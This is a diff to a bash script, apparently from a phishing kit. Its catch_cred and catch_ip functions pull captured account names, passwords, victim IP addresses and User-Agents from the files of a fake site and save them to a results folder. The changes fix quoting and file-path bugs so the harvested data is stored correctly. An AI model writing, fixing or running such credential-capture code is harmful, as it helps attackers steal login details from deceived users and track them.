@@ -370,8 +370,8 @@ catch_cred(){
   password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-  cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-  if [[ ! -d 'results/$server' ]]; then
+  cat sites/$server/usernames.txt >> results/$server/saved.usernames.txt
+  if [[ ! -d "results/$server" ]]; then
     mkdir results/$server
   fi
   TIME=$(date +%T)
@@ -398,7 +398,6 @@ getcredentials(){
 ##############################################################
 
 catch_ip(){
-  touch sites/$server/saved.usernames.txt
   ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
   IFS=$'\n'
   ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
@@ -406,11 +405,11 @@ catch_ip(){
   printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
   cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
-  if [[ ! -d 'results/$server' ]]; then
+  if [[ ! -d "results/$server" ]]; then
     mkdir results/$server
   fi
   TIME=$(date +%T)
-  cp sites/$server/saved.ip.txt.txt results/$server/ip_${SESHNAME}.${TIME}.txt
+  cp sites/$server/saved.ip.txt results/$server/ip_${SESHNAME}.${TIME}.txt
 
 
   if [[ -e iptracker.log ]]; then
